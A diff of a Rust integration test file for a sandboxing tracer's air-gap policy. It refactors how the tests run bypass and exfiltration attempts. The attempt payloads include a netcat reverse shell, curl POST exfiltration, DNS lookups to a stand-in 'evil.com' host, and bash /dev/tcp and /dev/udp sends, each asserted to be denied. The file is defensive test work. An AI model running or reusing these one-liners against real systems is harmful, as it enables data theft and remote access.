@@ -4,8 +4,6 @@
 //! runtime: native binary, Python, Node.js, and Bash.
 //! Documents what the policy catches vs. what slips through.
 
-use std::time::Duration;
-
 use crate::common::*;
 use crate::skip_if_no_bash_primary;
 use crate::skip_if_no_node_primary;
@@ -63,21 +61,15 @@ fn test_air_gap_bypass_attempts() {
     {
         let target = fixture("malicious_target");
         if target.exists() {
-            let output = run_tracer_with_timeout(
-                &[
-                    "x",
-                    "-p",
-                    POLICY,
-                    "--",
-                    target.to_str().unwrap(),
-                    "/dev/null",
-                    "127.0.0.1",
-                    "4444",
-                ],
-                Duration::from_secs(10),
-            );
-            let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-            let stderr = String::from_utf8_lossy(&output.stderr);
+            let output = cmd(&format!(
+                "x -p {} -- {} /dev/null 127.0.0.1 4444",
+                POLICY,
+                target.display()
+            ))
+            .timeout(secs(10))
+            .run();
+            let stdout = output.stdout();
+            let stderr = output.stderr();
             // connect() is denied by the network phase (deny: ["*"]).
             assert_denied!(
                 stdout,
@@ -93,12 +85,10 @@ fn test_air_gap_bypass_attempts() {
     // Use Node.js to spawn curl (exec monitoring catches it).
     skip_if_no_node_primary!(node => {
         let js_code = "try{require('child_process').execSync('curl -s http://127.0.0.1:4444')}catch(e){}";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -e {}", POLICY, node.display(), sq(js_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: curl -s http://127.0.0.1:4444"],
             "curl -s http://127.0.0.1:4444 should be denied by air-gap command policy.",
@@ -111,12 +101,10 @@ fn test_air_gap_bypass_attempts() {
     // blocked by the network phase (deny: ["*"]).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket\ns=socket.socket()\ns.settimeout(1)\ntry:\n s.connect(('127.0.0.1',4444))\nexcept: pass";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: connect("],
             "Python connect() should be denied by network deny rules.",
@@ -130,12 +118,10 @@ fn test_air_gap_bypass_attempts() {
         let js_code = "const s=require('net').connect({port:4444,host:'127.0.0.1',timeout:1000}); \
                        s.on('error',()=>{}); s.on('timeout',()=>s.destroy()); \
                        setTimeout(()=>process.exit(),2000)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -e {}", POLICY, node.display(), sq(js_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: connect("],
             "Node.js connect() should be denied by network deny rules.",
@@ -148,12 +134,10 @@ fn test_air_gap_bypass_attempts() {
     // connect() internally, which the network phase catches.
     skip_if_no_bash_primary!(bash => {
         let bash_code = "exec 3<>/dev/tcp/127.0.0.1/4444 2>/dev/null || true";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", bash.to_str().unwrap(), "-c", bash_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, bash.display(), sq(bash_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: connect(", "denied: getaddrinfo("],
             "Bash /dev/tcp should be denied by network phase.",
@@ -172,12 +156,10 @@ fn test_air_gap_exfiltration_attempts() {
     // on getaddrinfo (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket,time\ntry:\n socket.getaddrinfo('stolen-data.evil.com',80)\nexcept: pass\ntime.sleep(1)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &[r#"denied: getaddrinfo("stolen-data.evil.com", "80""#, "denied: syscall", "denied: connect("],
             "DNS exfil via Python getaddrinfo should be denied by network phase.",
@@ -189,12 +171,10 @@ fn test_air_gap_exfiltration_attempts() {
     // connect (urllib uses libc sockets underneath).
     skip_if_no_python_primary!(python => {
         let py_code = "import urllib.request,time\ntry:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:4444',data=b'stolen',method='POST'),timeout=1)\nexcept: pass\ntime.sleep(1)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &[r#"denied: getaddrinfo("127.0.0.1", "4444""#, "denied: syscall", "denied: connect("],
             "HTTP POST exfil via Python urllib should be denied by network phase.",
@@ -207,12 +187,10 @@ fn test_air_gap_exfiltration_attempts() {
     // by the network phase (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
         let py_code = "import socket,time\ntry:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.sendto(b'exfil',('127.0.0.1',4444))\nexcept: pass\ntime.sleep(1)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: sendto("],
             "UDP exfil via Python sendto() should be denied by network deny rules.",
@@ -231,12 +209,10 @@ fn test_air_gap_exfiltration_attempts() {
             req.write('stolen-data'); \
             req.end(); \
             setTimeout(()=>process.exit(),2000)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -e {}", POLICY, node.display(), sq(js_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: connect("],
             "HTTP POST exfil via Node.js connect() should be denied by network phase.",
@@ -251,12 +227,10 @@ fn test_air_gap_exfiltration_attempts() {
             const dns = require('dns'); \
             dns.resolve('stolen-data.evil.com', ()=>process.exit()); \
             setTimeout(()=>process.exit(),2000)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -e {}", POLICY, node.display(), sq(js_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: getaddrinfo(", "denied: connect("],
             "DNS exfil via Node.js should be denied by network phase.",
@@ -267,12 +241,10 @@ fn test_air_gap_exfiltration_attempts() {
     // Spawn a reverse shell via os.system. Caught by command deny on nc.
     skip_if_no_python_primary!(python => {
         let py_code = "import os,time\nos.system('nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || true')\ntime.sleep(1)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: nc -e /bin/sh 127.0.0.1 4444"],
             "Reverse shell via Python os.system(nc -e /bin/sh 127.0.0.1 4444) should be denied.",
@@ -284,12 +256,10 @@ fn test_air_gap_exfiltration_attempts() {
     // (os.system uses /bin/sh -c → execve, reliably hooked.)
     skip_if_no_python_primary!(python => {
         let py_code = "import os,time\nos.system('curl -s -X POST -d secret=value http://127.0.0.1:4444 2>/dev/null || true')\ntime.sleep(1)";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: curl -s -X POST -d"],
             "curl -s -X POST -d exfil via Python os.system should be denied.",
@@ -301,12 +271,10 @@ fn test_air_gap_exfiltration_attempts() {
     // Caught by network phase on connect/sendto (deny: ["*"]).
     skip_if_no_bash_primary!(bash => {
         let bash_code = "echo stolen-data > /dev/udp/127.0.0.1/4444 2>/dev/null || true";
-        let output = run_tracer_with_timeout(
-            &["x", "-p", POLICY, "--", bash.to_str().unwrap(), "-c", bash_code],
-            Duration::from_secs(10),
-        );
-        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
-        let stderr = String::from_utf8_lossy(&output.stderr);
+        let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, bash.display(), sq(bash_code)))
+            .timeout(secs(10)).run();
+        let stdout = output.stdout();
+        let stderr = output.stderr();
         assert_denied!(stdout, stderr,
             &["denied: connect(", "denied: getaddrinfo("],
             "Bash /dev/udp should be denied by network phase.",
